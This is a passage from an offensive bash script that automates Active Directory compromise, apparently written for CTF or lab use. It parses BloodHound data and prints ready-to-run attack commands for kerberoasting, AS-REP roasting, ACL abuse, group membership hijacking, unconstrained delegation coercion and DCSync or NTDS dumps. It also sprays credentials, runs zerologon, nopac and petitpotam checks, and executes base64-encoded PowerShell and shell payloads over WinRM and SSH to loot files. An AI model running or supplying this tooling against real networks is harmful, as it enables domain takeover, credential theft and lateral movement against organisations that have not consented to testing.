            echo "         dacledit.py -action write -rights WriteMembers -principal '${who}' -target '${grp}' '${DOMAIN}/${who}:<password>' -dc-ip ${IP}" ;;
        esac
        echo ""
        echo "    ── ROUTE · Add yourself to '${grp}' (you inherit its privileges) ──"
        echo "      net rpc group addmem '${grp}' '${who}' -U '${DOMAIN}/${who}%<password>' -S ${IP}"
        echo "         (or) bloodyAD -u '${who}' -p '<password>' -d '${DOMAIN}' --host ${IP} add groupMember '${grp}' '${who}'"
        echo "      re-auth as '${who}' to use the new membership; if '${grp}' grants DCSync/admin -> dump the domain:"
        echo "         nxc smb ${IP} -u '${who}' -p '<password>' --ntds"
        echo "      ↳ ${HT}/acl-persistence-abuse/index.html"
        echo ""
        echo "    NOTE: <password> for '${who}' is in loot/valid_creds.txt."
        echo ""
        } | tee -a "$an"
    }

    local krb_users="" asrep_users="" unconst="" dcsync_names=""
    # Kerberoastable (exclude krbtgt + machine accounts -> not useful roast targets)
    _bhq '.data[]|select(.Properties.hasspn==true and (.Properties.enabled//true)==true)|select((.Properties.samaccountname//"")|ascii_downcase != "krbtgt")|select((.Properties.samaccountname//"")|test("\\$$")|not)|.Properties.samaccountname' \
         "$U" "Kerberoastable users (hasspn)" "[!] BloodHound: kerberoastable account(s) ($IP)" && krb_users="$BHQ_RES"
    _bhq '.data[]|select(.Properties.dontreqpreauth==true)|.Properties.samaccountname' \
         "$U" "AS-REP roastable users (dontreqpreauth)" "[!] BloodHound: AS-REP roastable account(s) ($IP)" && asrep_users="$BHQ_RES"
    # Descriptions with secret-like words (dropped bare 'key' = noisy; skip krbtgt)
    _bhq '.data[]|select((.Properties.samaccountname//"")|ascii_downcase != "krbtgt")|select(.Properties.description!=null)|select(.Properties.description|test("(?i)pass|pwd|cred|secret"))|"\(.Properties.samaccountname): \(.Properties.description)"' \
         "$U" "Descriptions mentioning secrets" "[!] BloodHound: password-like description(s) ($IP)"
    _bhq '.data[]|select(.Properties.passwordnotreqd==true)|.Properties.samaccountname' \
         "$U" "PASSWD_NOTREQD users (often login with blank password)"
    _bhq '.data[]|select((.Properties.admincount//false)==true)|.Properties.samaccountname' \
         "$U" "admincount=1 (protected/high-value) users"
    # Unconstrained delegation but EXCLUDE the DC (DCs are unconstrained by design)
    [[ -n "$C" ]] && _bhq '.data[]|select((.Properties.unconstraineddelegation//false)==true)|select((.PrimaryGroupSID//"")|test("-516$")|not)|.Properties.name' \
         "$C" "Unconstrained-delegation computers (NON-DC = abusable)" "[!] BloodHound: non-DC unconstrained delegation ($IP)" && unconst="$BHQ_RES"
    [[ -n "$C" ]] && _bhq '.data[]|select((.Properties.allowedtodelegate//[])|length>0)|"\(.Properties.name) -> \((.Properties.allowedtodelegate//[])|join(\", \"))"' \
         "$C" "Constrained-delegation computers"

    # ---- DCSync detection: principals with replication rights over the domain ----
    if [[ -n "$D" ]]; then
        local gc gca inter direct genall caps sid nm names="" expanded=""
        gc=$(jq -r '.data[].Aces[]?|select((.RightName//"")|test("^GetChanges$";"i"))|.PrincipalSID' "$D" 2>/dev/null | sort -u)
        gca=$(jq -r '.data[].Aces[]?|select((.RightName//"")|test("GetChangesAll";"i"))|.PrincipalSID' "$D" 2>/dev/null | sort -u)
        inter=$(comm -12 <(printf '%s\n' "$gc") <(printf '%s\n' "$gca") 2>/dev/null)
        direct=$(jq -r '.data[].Aces[]?|select((.RightName//"")|test("^DCSync$";"i"))|.PrincipalSID' "$D" 2>/dev/null | sort -u)
        # GenericAll / AllExtendedRights on the domain object also grant DCSync
        genall=$(jq -r '.data[].Aces[]?|select((.RightName//"")|test("^(GenericAll|AllExtendedRights)$";"i"))|.PrincipalSID' "$D" 2>/dev/null | sort -u)
        caps=$(printf '%s\n%s\n%s\n' "$inter" "$direct" "$genall" | sed '/^[[:space:]]*$/d' | sort -u)
        if [[ -n "$caps" ]]; then
            while IFS= read -r sid; do
                [[ -z "$sid" ]] && continue
                # resolve SID -> name (search users + groups)
                nm=$(jq -r --arg s "$sid" '.data[]|select(.ObjectIdentifier==$s)|.Properties.samaccountname//.Properties.name' "$U" "$G" 2>/dev/null | sed '/^null$/d' | head -1)
                [[ -z "$nm" ]] && nm="$sid"
                names+="$nm"$'\n'
                # if the SID is a GROUP, expand one level of members -> their names
                while IFS= read -r msid; do
                    [[ -z "$msid" ]] && continue
                    local mnm; mnm=$(jq -r --arg s "$msid" '.data[]|select(.ObjectIdentifier==$s)|.Properties.samaccountname//.Properties.name' "$U" "$G" 2>/dev/null | sed '/^null$/d' | head -1)
                    [[ -n "$mnm" ]] && expanded+="$mnm"$'\n'
                done < <(jq -r --arg s "$sid" '.data[]|select(.ObjectIdentifier==$s)|.Members[]?.ObjectIdentifier' "$G" 2>/dev/null)
            done <<< "$caps"
            dcsync_names=$(printf '%s%s' "$names" "$expanded" | sed 's/@.*$//; /^[[:space:]]*$/d' | sort -u)
            { echo "== DCSync (domain-replication) principals =="; printf '%s\n\n' "$dcsync_names"; } >> "$an"
            echo "  DCSync principals: $(printf '%s' "$dcsync_names" | tr '\n' ',' | sed 's/,$//; s/,/, /g')"
            add_lead "[!] BloodHound: DCSync rights detected ($IP)" "Principals: $(printf '%s' "$dcsync_names" | tr '\n' ',' | sed 's/,$//; s/,/, /g')"
        else
            info "No DCSync/replication rights surfaced in BloodHound data."
        fi
    fi
    # --- Computer takeover via dangerous ACEs (RBCD / shadow-cred paths) ------
    # GenericAll/GenericWrite/WriteDacl/WriteOwner/AddKeyCredentialLink on a
    # computer object, held by a NON-default principal, is a takeover of that
    # host. If a principal WE control holds it, that is a direct privesc (the
    # Support path: "Shared Support Accounts" has GenericAll on the DC computer).
    # default high-priv principals to ignore (built-ins / well-known SIDs)
    local DEFP='-(498|512|516|518|519|520|521|522|526|527)$|S-1-5-32-(544|548|549|550|551)|S-1-5-9$|S-1-5-18$'
    local takeover_paths=""   # "who|principal|right|computer" per line (owned only)
    if [[ -n "$C" ]]; then
        local rows psid right comp pname who printed=0
        rows=$(jq -r '.data[] | .Properties.name as $c | (.Aces[]? | select((.RightName//"")|test("^(GenericAll|GenericWrite|WriteDacl|WriteOwner|AddKeyCredentialLink)$";"i")) | "\(.PrincipalSID)\t\(.RightName)\t\($c)")' "$C" 2>/dev/null)
        while IFS=$'\t' read -r psid right comp; do
            [[ -z "$psid" ]] && continue
            echo "$psid" | grep -qE -- "$DEFP" && continue          # skip default high-priv principals
            pname=$(_bh_name "$psid"); [[ -z "$pname" ]] && pname="$psid"; pname="${pname%@*}"
            if [[ "$printed" -eq 0 ]]; then echo "== Computer takeover (dangerous ACEs -> RBCD / shadow-creds) ==" >> "$an"; echo "  Computer-takeover ACEs (non-default principals):"; printed=1; fi
            printf '    %s --%s--> %s\n' "$pname" "$right" "$comp" | tee -a "$an"
            who=$(_owned_via "$psid")
            if [[ -n "$who" ]]; then
                takeover_paths+="${who}|${pname}|${right}|${comp}"$'\n'
                add_lead "[!!] YOU control ${comp} via ${right} (as ${who} through ${pname}) ($IP)" "Full steps + both routes in loot/bh_analysis.txt (PLAYBOOK); ${HT}/resource-based-constrained-delegation.html"
            fi
        done <<< "$rows"
        [[ "$printed" -eq 1 ]] && echo "" >> "$an"
    fi

    # ---- dangerous ACEs on USER objects (non-default principals) ----
    local user_takeover_paths=""
    if [[ -n "$U" ]]; then
        local urows upsid uright utgt upname uwho uprinted=0
        urows=$(jq -r '.data[] | .Properties.name as $t | (.Aces[]? | select((.RightName//"")|test("^(GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword|AddKeyCredentialLink|AllExtendedRights)$";"i")) | "\(.PrincipalSID)\t\(.RightName)\t\($t)")' "$U" 2>/dev/null)
        while IFS=$'\t' read -r upsid uright utgt; do
            [[ -z "$upsid" ]] && continue
            echo "$upsid" | grep -qE -- "$DEFP" && continue
            upname=$(_bh_name "$upsid"); [[ -z "$upname" ]] && upname="$upsid"; upname="${upname%@*}"
            [[ "${upname,,}@" == "${utgt,,}" || "${upname,,}" == "${utgt%@*}" ]] && continue   # skip self-ACE
            if [[ "$uprinted" -eq 0 ]]; then echo "== Object-control ACEs on USERS (reset / shadow-creds / targeted roast) ==" >> "$an"; echo "  User-control ACEs (non-default principals):"; uprinted=1; fi
            printf '    %s --%s--> %s (user)\n' "$upname" "$uright" "$utgt" | tee -a "$an"
            uwho=$(_owned_via "$upsid")
            [[ -n "$uwho" ]] && { user_takeover_paths+="${uwho}|${upname}|${uright}|${utgt}"$'\n'; add_lead "[!!] YOU control user ${utgt} via ${uright} (as ${uwho}) ($IP)" "Steps in loot/bh_analysis.txt (PLAYBOOK); ${HT}/acl-persistence-abuse/index.html"; }
        done <<< "$urows"
        [[ "$uprinted" -eq 1 ]] && echo "" >> "$an"
    fi

    # ---- dangerous ACEs on GROUP objects (non-default principals) ----
    local group_takeover_paths=""
    if [[ -n "$G" ]]; then
        local grows gpsid gright gtgt gpname gwho gprinted=0
        grows=$(jq -r '.data[] | .Properties.name as $t | (.Aces[]? | select((.RightName//"")|test("^(GenericAll|GenericWrite|WriteDacl|WriteOwner|AddSelf|AddMember|AllExtendedRights)$";"i")) | "\(.PrincipalSID)\t\(.RightName)\t\($t)")' "$G" 2>/dev/null)
        while IFS=$'\t' read -r gpsid gright gtgt; do
            [[ -z "$gpsid" ]] && continue
            echo "$gpsid" | grep -qE -- "$DEFP" && continue
            gpname=$(_bh_name "$gpsid"); [[ -z "$gpname" ]] && gpname="$gpsid"; gpname="${gpname%@*}"
            if [[ "$gprinted" -eq 0 ]]; then echo "== Group-control ACEs (add yourself to privileged groups) ==" >> "$an"; echo "  Group-control ACEs (non-default principals):"; gprinted=1; fi
            printf '    %s --%s--> %s (group)\n' "$gpname" "$gright" "$gtgt" | tee -a "$an"
            gwho=$(_owned_via "$gpsid")
            [[ -n "$gwho" ]] && { group_takeover_paths+="${gwho}|${gpname}|${gright}|${gtgt}"$'\n'; add_lead "[!!] YOU can add to group ${gtgt} via ${gright} (as ${gwho}) ($IP)" "Steps in loot/bh_analysis.txt (PLAYBOOK); ${HT}/acl-persistence-abuse/index.html"; }
        done <<< "$grows"
        [[ "$gprinted" -eq 1 ]] && echo "" >> "$an"
    fi

    # ======================================================================
    #  CREDENTIALS YOU HOLD -> what each account can do (provided + discovered)
    # ======================================================================
    { echo "== CREDENTIALS YOU HOLD (provided on CLI + discovered on the way) =="; } | tee -a "$an"
    local acct cap tp _p tprin tright tcomp up gp uprin uright utgt gprin gright gtgt
    while IFS= read -r acct; do
        [[ -z "$acct" ]] && continue
        cap=""
        tp=$(printf '%s' "$takeover_paths" | awk -F'|' -v a="$acct" 'tolower($1)==a{print; exit}')
        if [[ -n "$tp" ]]; then
            IFS='|' read -r _p tprin tright tcomp <<< "$tp"
            cap="*** PRIVESC to Domain Admin *** : ${tright} on ${tcomp} (through '${tprin}') - see PLAYBOOK"
        fi
        up=$(printf '%s' "$user_takeover_paths" | awk -F'|' -v a="$acct" 'tolower($1)==a{print; exit}')
        [[ -n "$up" ]] && { IFS='|' read -r _p uprin uright utgt <<< "$up"; cap="${cap:+$cap | }controls user '${utgt%@*}' (${uright}) - see PLAYBOOK"; }
        gp=$(printf '%s' "$group_takeover_paths" | awk -F'|' -v a="$acct" 'tolower($1)==a{print; exit}')
        [[ -n "$gp" ]] && { IFS='|' read -r _p gprin gright gtgt <<< "$gp"; cap="${cap:+$cap | }can add to group '${gtgt%@*}' (${gright}) - see PLAYBOOK"; }
        printf '%s\n' "$krb_users"    | grep -qixF "$acct" && cap="${cap:+$cap | }kerberoastable"
        printf '%s\n' "$asrep_users"  | grep -qixF "$acct" && cap="${cap:+$cap | }AS-REP roastable"
        printf '%s\n' "$dcsync_names" | grep -qixF "$acct" && cap="${cap:+$cap | }holds DCSync rights"
        [[ -z "$cap" ]] && cap="domain user - no outbound object control found in BloodHound"
        printf '    %-16s %s\n' "$acct" "$cap" | tee -a "$an"
    done <<< "$owned"
    echo "" | tee -a "$an"

    # ======================================================================
    #  PLAYBOOK -> explicit, account-specific steps + HackTricks references
    # ======================================================================
    { echo "== PLAYBOOK (explicit steps + references) =="; } | tee -a "$an"
    local seen="" pb_who pb_prin pb_right pb_comp
    local pseen="" pu_who pu_prin pu_right pu_tgt pg_who pg_prin pg_right pg_tgt
    # 1) owned computer-takeover paths = the privesc to DA
    while IFS='|' read -r pb_who pb_prin pb_right pb_comp; do
        [[ -z "$pb_who" ]] && continue
        printf '%s\n' "$seen" | grep -qxF "$pb_who|$pb_comp" && continue; seen+="$pb_who|$pb_comp"$'\n'
        _emit_computer_takeover "$pb_who" "$pb_prin" "$pb_right" "$pb_comp"
    done <<< "$takeover_paths"
    # 1b) owned user-object control
    while IFS='|' read -r pu_who pu_prin pu_right pu_tgt; do
        [[ -z "$pu_who" ]] && continue
        printf '%s\n' "$pseen" | grep -qxF "u|$pu_who|$pu_tgt" && continue; pseen+="u|$pu_who|$pu_tgt"$'\n'
        _emit_user_takeover "$pu_who" "$pu_prin" "$pu_right" "$pu_tgt"
    done <<< "$user_takeover_paths"
    # 1c) owned group control
    while IFS='|' read -r pg_who pg_prin pg_right pg_tgt; do
        [[ -z "$pg_who" ]] && continue
        printf '%s\n' "$pseen" | grep -qxF "g|$pg_who|$pg_tgt" && continue; pseen+="g|$pg_who|$pg_tgt"$'\n'
        _emit_group_takeover "$pg_who" "$pg_prin" "$pg_right" "$pg_tgt"
    done <<< "$group_takeover_paths"
    # 2) kerberoast
    if [[ -n "$krb_users" ]]; then
        { echo "  ── Kerberoasting :: $(printf '%s' "$krb_users" | tr '\n' ' ') ──"
          echo "      WHO: any authenticated user (you have '$USER'); request the SPN ticket, crack offline."
          echo "      1) nxc ldap ${IP} -u '${USER}' -p '<password>' --kerberoasting kerb.txt"
          echo "         (or) GetUserSPNs.py -request -dc-ip ${IP} '${DOMAIN}/${USER}:<password>' -outputfile kerb.txt"
          echo "      2) hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt"
          echo "      ↳ ${HT}/kerberoast.html"; echo ""; } | tee -a "$an"
    fi
    # 3) asrep
    if [[ -n "$asrep_users" ]]; then
        { echo "  ── AS-REP Roasting :: $(printf '%s' "$asrep_users" | tr '\n' ' ') ──"
          echo "      WHO: no password needed - these accounts have Kerberos pre-auth disabled."
          echo "      1) GetNPUsers.py -dc-ip ${IP} -no-pass -request '${DOMAIN}/' -format hashcat -outputfile asrep.txt"
          echo "      2) hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"
          echo "      ↳ ${HT}/asreproast.html"; echo ""; } | tee -a "$an"
    fi
    # 4) unconstrained delegation (non-DC)
    if [[ -n "$unconst" ]]; then
        { echo "  ── Unconstrained Delegation :: $(printf '%s' "$unconst" | tr '\n' ' ') ──"
          echo "      WHO: an admin of that host. Coerce a DC to auth to it, capture the DC\$ TGT, then DCSync."
          echo "      1) (admin on the host)  Rubeus.exe monitor /interval:1 /nowrap"
          echo "      2) coerce the DC:  printerbug.py '${DOMAIN}/${USER}:<password>@<this-host>' <dc-fqdn>"
          echo "      3) load the captured DC\$ TGT (Rubeus ptt) -> DCSync the domain"
          echo "      ↳ ${HT}/unconstrained-delegation.html"; echo ""; } | tee -a "$an"
    fi
    # 5) DCSync - do we already control a replication principal?
    local dc_owned; dc_owned=$(printf '%s\n' "$dcsync_names" | tr 'A-Z' 'a-z' | sort -u | comm -12 - <(printf '%s\n' "$owned") | head -1)
    if [[ -n "$dc_owned" ]]; then
        { echo "  ── DCSync (you already hold replication rights as '${dc_owned}') ──"
          echo "      1) nxc smb ${IP} -u '${dc_owned}' -p '<password>' --ntds"
          echo "         (or) secretsdump.py -just-dc '${DOMAIN}/${dc_owned}:<password>@${IP}'"
          echo "      2) Pass-the-Hash as Administrator with the recovered hash."
          echo "      ↳ ${HT}/dcsync.html"; echo ""; } | tee -a "$an"
        _attempt_dcsync "$dcsync_names"
    elif [[ -n "$dcsync_names" ]]; then
        { echo "  ── DCSync principals exist (you don't control one yet) ──"
          echo "      Holders: $(printf '%s' "$dcsync_names" | tr '\n' ',' | sed 's/,$//; s/,/, /g')"
          echo "      Reach one of these (e.g. via a computer-takeover path above) to dump the whole domain."
          echo "      ↳ ${HT}/dcsync.html"; echo ""; } | tee -a "$an"
    fi
    { echo "  General AD ACL/ACE abuse reference: ${HT}/acl-persistence-abuse/index.html"; echo ""; } | tee -a "$an"
    ok "BloodHound analysis written -> loot/bh_analysis.txt"
}


# ════════════════════════════════════════════════════════════════════════════
#  Flag retrieval: WinRM (Windows) / SSH (Linux) using any VALID credential
#  Lockout-safe: every credential tried already has a known-correct password
#  (initial creds are validated; sprayed creds authenticated), so this never
#  generates a bad-password attempt. Commands are base64-wrapped to survive the
#  shell layers intact (no fragile nested quoting of PowerShell $_ / shell $vars).
# ════════════════════════════════════════════════════════════════════════════
_flag_b64_ps() {   # base64(UTF-16LE) of the Windows flag-hunt PowerShell
    local ps='Get-ChildItem -Path C:\Users -Recurse -Force -Include user.txt,root.txt,flag.txt -ErrorAction SilentlyContinue | ForEach-Object { Write-Output ("FLAGFILE::" + $_.FullName + "::" + ((Get-Content -Raw -ErrorAction SilentlyContinue $_.FullName))) }'
    printf '%s' "$ps" | iconv -t UTF-16LE 2>/dev/null | base64 -w0 2>/dev/null
}
_flag_b64_sh() {   # base64 of the Linux flag-hunt shell
    local sh='{ find /home /root /tmp /var/www -maxdepth 5 -type f \( -name user.txt -o -name root.txt -o -name flag.txt \) 2>/dev/null; } | while read -r f; do printf "FLAGFILE::%s::%s\n" "$f" "$(cat "$f" 2>/dev/null)"; done'
    printf '%s' "$sh" | base64 -w0 2>/dev/null
}
_show_flags() {    # $1 raw output  $2 proto  $3 user  -> returns 0 if a flag was shown
    local out="$1" proto="$2" who="$3" line path val name found=1
    while IFS= read -r line; do
        echo "$line" | grep -qa 'FLAGFILE::' || continue
        path=$(printf '%s' "$line" | awk -F'::' '{print $2}')
        val=$(printf '%s'  "$line" | awk -F'::' '{print $3}' | tr -d '\r' | sed 's/^[[:space:]]*//; s/[[:space:]]*$//')
        [[ -z "$path" || -z "$val" ]] && continue
        name="${path##*[\\/]}"
        printf '%b\n'      "${GREEN}${BOLD}  ★ FLAG  ${name}  (${who} via ${proto})${RESET}"
        printf '%b   %s\n' "${GREEN}${BOLD}     ${val}${RESET}" "$path"
        add_lead "[+] FLAG ${name} captured on $IP (${who} via ${proto}): ${val}" "Path: ${path}"
        printf '%s\t%s\t%s\n' "$name" "$val" "$path" >> "$LOOT/flags_$IP.txt"
        found=0
    done <<< "$out"
    return $found
}
grab_flags() {
    [[ "$MODE" == "auth" ]] || return 0
    need nxc "flag retrieval" || return 0
    local has_winrm=0 has_ssh=0
    echo ",$OPEN_PORTS," | grep -qE ',(5985|5986),' && has_winrm=1
    echo ",$OPEN_PORTS," | grep -qE ',22,'          && has_ssh=1
    [[ "$has_winrm" -eq 0 && "$has_ssh" -eq 0 ]] && return 0
    # candidates: initial creds + every validated/discovered pair (all correct pws)
    local cand="$LOOT/.flag_creds" u p auth out b64
    { [[ -n "$PASS" || -n "$HASH" ]] && printf '%s\t%s\n' "$USER" "$PASS"
      [[ -s "$LOOT/valid_creds.txt" ]] && cat "$LOOT/valid_creds.txt"
    } | awk 'NF' | sort -u > "$cand"
    [[ -s "$cand" ]] || return 0
    setout flags "Flag retrieval (WinRM / SSH)"

    if [[ "$has_winrm" -eq 1 ]]; then
        b64=$(_flag_b64_ps)
        if [[ -n "$b64" ]]; then
            while IFS=$'\t' read -r u p; do
                [[ -z "$u" ]] && continue
                if [[ -n "$p" ]]; then auth="-u '$u' -p '$p' ${DOMAIN:+-d '$DOMAIN'}"
                elif [[ -n "$HASH" && "$u" == "$USER" ]]; then auth="-u '$u' -H '$HASH' ${DOMAIN:+-d '$DOMAIN'}"
                else continue; fi
                out=$(capc "$TMO_MED" "$PCQ nxc winrm $IP $auth -X 'powershell -ep bypass -enc $b64' 2>&1")
                _show_flags "$out" "winrm" "$u" && break   # stop at first cred that yields a flag
            done < "$cand"
        else
            info "iconv/base64 unavailable; skipping WinRM flag retrieval."
        fi
    fi
    if [[ "$has_ssh" -eq 1 ]]; then
        b64=$(_flag_b64_sh)
        while IFS=$'\t' read -r u p; do
            [[ -z "$u" || -z "$p" ]] && continue
            out=$(capc "$TMO_MED" "$PCQ nxc ssh $IP -u '$u' -p '$p' -x 'echo $b64 | base64 -d | sh' 2>&1")
            _show_flags "$out" "ssh" "$u" && break
        done < "$cand"
    fi
    [[ -s "$LOOT/flags_$IP.txt" ]] || info "No flags retrieved (no shell-capable credential, or flags not in standard locations)."
}

# ════════════════════════════════════════════════════════════════════════════
#  Credential spray (--aggressive): found/cracked/sprayed secrets x users.txt
# ════════════════════════════════════════════════════════════════════════════
run_cred_spray() {
    [[ "$AGGRESSIVE" -eq 1 ]] || return 0
    [[ "$CREDS_VALID" -eq 1 ]] || return 0
    local secrets="$LOOT/candidate_secrets_$IP.txt" users="$LOOT/users.txt"
    [[ -s "$secrets" ]] || return 0
    sort -u -o "$secrets" "$secrets" 2>/dev/null   # dedupe (cracked/sprayed pws appended here)
    [[ -s "$users" ]] || return 0
    setout spray "Credential spray (found secrets x enumerated users)"
    warn "AGGRESSIVE: spraying $(wc -l <"$secrets") secret(s) across $(wc -l <"$users") users (LOCKOUT RISK)."
    local svc out l tail user pw mark
    for svc in smb winrm; do
        out=$(capc "$TMO_LONG" "$PCQ nxc $svc $IP -u $users -p $secrets ${DOMAIN:+-d '$DOMAIN'} --continue-on-success 2>&1 | grep -a '\[+\]'")
        if [[ -n "$out" ]]; then
            printf '%s\n' "$out" >> "$CUR_OUT"
            while IFS= read -r l; do
                [[ -z "$l" ]] && continue
                echo "$l" | grep -qiE '\(Guest\)' && continue   # guest fallback -> false positive
                tail=$(printf '%s' "${l##*\\}" | sed 's/[[:space:]]*$//')
                user=$(printf '%s' "$tail" | sed -E 's/:.*$//')
                pw=$(printf '%s' "$tail" | sed -E 's/^[^:]*:(.*)$/\1/; s/ *\((Pwn3d!|Guest)\) *$//; s/[[:space:]]*$//')
                mark=""; echo "$l" | grep -qiE '\(Pwn3d!\)' && mark=" (Pwn3d!)"
                add_lead "[+] Validated credential on $svc ($IP): ${user}:${pw}${mark}" "Confirmed working credential pair"
                [[ -n "$pw" ]] && printf '%s\t%s\n' "$user" "$pw" >> "$LOOT/valid_creds.txt"   # for flag retrieval
                [[ "$svc" == "smb" && -n "$mark" ]] && printf '%s\t%s\n' "$user" "$pw" >> "$LOOT/pwned_smb_creds.txt"
            done <<< "$out"
        fi
    done
}

# ════════════════════════════════════════════════════════════════════════════
#  PHASE 3 - vulnerability leads
# ════════════════════════════════════════════════════════════════════════════
vuln_phase() {
    setout vuln "NetExec safe checks"
    harvest_users          # build loot/users.txt from all enumeration (auth)
    # WebClient / WebDAV (HTTP coercion relay candidate)
    local out
    out=$(capc "$TMO_SHORT" "$PCQ nxc smb $IP $(nxc_auth) -M webdav 2>&1")
    echo "$out" | grep -qiE 'WebClient.*enabled|webdav.*True' && add_lead "[!] WebClient/WebDAV running ($IP)" "HTTP->LDAP/ADCS coercion relay candidate (ntlmrelayx)"

    crack_hashes           # crack harvested Kerberoast/AS-REP hashes (offline, safe)

    if [[ "$AGGRESSIVE" -eq 1 ]]; then
        warn "AGGRESSIVE: disruptive nxc modules (may crash/alter the target)."
        local A; A=$(nxc_auth)
        for m in zerologon nopac petitpotam; do
            out=$(capc "$TMO_MED" "$PCQ nxc smb $IP $A -M $m 2>&1")
            echo "$out" | grep -qiE 'VULNERABLE|may be vulnerable' && add_lead "[!] $m: target appears VULNERABLE ($IP)" "Validate carefully before exploiting"
        done
        spray_passwords    # users.txt x wordlist (lockout-aware)
        run_cred_spray     # found/cracked/sprayed secrets x users.txt
        ntds_dump          # dump NTDS.dit with any local-admin cred (initial or discovered)
    else
        info "Disruptive checks skipped (use --aggressive to enable zerologon/nopac/petitpotam + spraying)."
    fi

    # BloodHound jq analysis (read-only) runs in auth mode regardless; its auto-DCSync
    # action is internally aggressive-gated. Placed last so it sees discovered creds.
    [[ "$DO_BLOODHOUND" -eq 1 ]] && parse_bloodhound

    # Auto-loot flags over WinRM/SSH using any validated credential (lockout-safe).
    [[ "$DO_FLAGS" -eq 1 ]] && grab_flags
    [[ "$DO_FLAGS" -eq 0 ]] && info "Flag hunt skipped (--no-flags / box-build mode)."
}

# ════════════════════════════════════════════════════════════════════════════
#  PHASE 4 - summary
# ════════════════════════════════════════════════════════════════════════════
write_summary() {
    {
        echo "============================================================"
        echo " ENUMERATION SUMMARY - $IP"
        echo " Mode: $MODE   Domain: ${DOMAIN:-<none>}   Generated: $(date)"
        echo "============================================================"
        echo
        echo "OPEN PORTS:"
        echo "  ${OPEN_PORTS:-<none>}"
        echo
        echo "SERVICES (port  service  product/version  | fscan notes):"
        [[ -s "$SCANS/service_detail.txt" ]] && cat "$SCANS/service_detail.txt" || echo "  (none parsed)"
        echo
        if [[ -s "$SCANS/fscan_findings.txt" ]]; then
            echo "FSCAN KEY FINDINGS:"
            sed 's/^/  /' "$SCANS/fscan_findings.txt"
            echo
        fi
        echo "LDAP CREDENTIAL-BEARING FIELDS (ldapsearch):"
        if [[ -s "$LOOT/ldap_interesting_$IP.txt" ]]; then
            sed 's/^/  /' "$LOOT/ldap_interesting_$IP.txt"
        else
            echo "  (none - needs --auth with valid domain creds; ldapsearch required)"
        fi
        echo
        if ls "$LOOT"/bh_*.zip &>/dev/null; then
            echo "BLOODHOUND:"
            echo "  Collected: $(ls "$LOOT"/bh_*.zip | paste -sd' ' -)"
            echo "  -> Import, mark owned, run 'Shortest Paths to Domain Admins'."
            echo
        fi
        echo "------------------------------------------------------------"
        echo " LEADS / NEXT STEPS"
        echo "------------------------------------------------------------"
        echo
        if [[ -s "$LEADS" ]]; then cat "$LEADS"; else echo "(no high-signal leads flagged)"; fi
        echo
        echo "------------------------------------------------------------"
        echo " Full detail: services/*.txt   |   Commands: _commands.log"
        echo " Loot (hashes/dumps): loot/"
        echo "============================================================"
    } > "$SUMMARY"
    cat "$SUMMARY"
}

# ════════════════════════════════════════════════════════════════════════════
#  PREFLIGHT
# ════════════════════════════════════════════════════════════════════════════
preflight() {
    echo -e "${BOLD}==================== PREFLIGHT: tool check ====================${RESET}"
    local core=(fscan nxc) missing_core=()
    for t in "${core[@]}"; do
        if have "$t"; then ok "core: $t"; else err "core: $t  (REQUIRED - missing)"; missing_core+=("$t"); fi
    done
    [[ ${#missing_core[@]} -gt 0 ]] && { err "Install missing core tools and re-run."; exit 1; }

    local optional=(enum4linux-ng smbclient rpcclient ldapsearch bloodhound-python \
                    ldapdomaindump certipy kerbrute pre2k adidnsdump Coercer \
                    GetUserSPNs.py GetNPUsers.py targetedKerberoast.py rpcdump.py samrdump.py \
                    hashcat john hydra jq unzip \
                    whatweb curl nuclei feroxbuster ffuf onesixtyone snmpwalk \
                    nikto sqlmap testssl.sh sslscan gobuster wfuzz wget lftp \
                    redis-cli showmount dig nc)
    local miss=()
    for t in "${optional[@]}"; do have "$t" || miss+=("$t"); done
    [[ ${#miss[@]} -gt 0 ]] && info "Optional tools not installed (handlers will skip): ${miss[*]}"
}

# ════════════════════════════════════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════════════════════════════════════
echo "Reminder: only enumerate systems you are authorized to test."
art_banner
echo -e "  ${BOLD}Target : ${YELLOW}$IP${RESET}"
echo -e "  ${BOLD}Mode   : ${YELLOW}$MODE${RESET}   Domain: ${YELLOW}${DOMAIN:-<none>}${RESET}   Aggressive: ${YELLOW}$([[ $AGGRESSIVE -eq 1 ]] && echo on || echo off)${RESET}   Output: ${YELLOW}$([[ $VERBOSE -eq 1 ]] && echo verbose || echo compact)${RESET}"
echo -e "  ${BOLD}Pivot  : ${YELLOW}$PIVOT${RESET}$([[ -n "$SOCKS" ]] && echo -e "   SOCKS: ${YELLOW}$SOCKS${RESET}")"
echo -e "  ${BOLD}Output : ${YELLOW}$OUTDIR${RESET}"
echo

preflight

# ---- Phase 1: discovery ----
phase 1 "PORT DISCOVERY (fscan, all 65535 TCP)"
_start_heartbeat "PHASE 1: PORT DISCOVERY (fscan, all 65535 TCP)"
discover_ports
_stop_heartbeat
[[ -z "$OPEN_PORTS" ]] && { warn "No open ports found by fscan. Check connectivity / proxy. Exiting."; write_summary; exit 0; }

# ---- Phase 2: per-service enumeration ----
phase 2 "PER-SERVICE ENUMERATION"
_start_heartbeat "PHASE 2: PER-SERVICE ENUMERATION"
# read service map on fd3 so handler subtools can't drain the loop's stdin
while read -r port svc <&3; do
    [[ -z "$port" ]] && continue
    h=$(route_handler "$port")
    [[ -z "$h" ]] && { vinfo "No handler for $port/$svc - skipping"; continue; }
    _want_svc "${h#h_}" || { vinfo "skipping ${h#h_} ($port) - not in --services"; continue; }
    [[ -n "${HANDLER_RAN[$h]}" ]] && continue   # one run per service family
    HANDLER_RAN[$h]=1
    # each handler prints its own clean section header via setout()
    CUR_OUT="$SVCDIR/${h#h_}.txt"; : >> "$CUR_OUT"
    "$h" "$port"
done 3< "$SCANS/service_map.txt"
_stop_heartbeat

# ---- Phase 3: vuln leads ----
phase 3 "VULNERABILITY LEADS"
_start_heartbeat "PHASE 3: VULNERABILITY LEADS"
vuln_phase
_stop_heartbeat

# ---- Phase 4: summary ----
phase 4 "WRITING SUMMARY"
write_summary
echo
echo -e "${GREEN}${BOLD}Done.${RESET} Read the lead sheet: ${BOLD}$SUMMARY${RESET}"
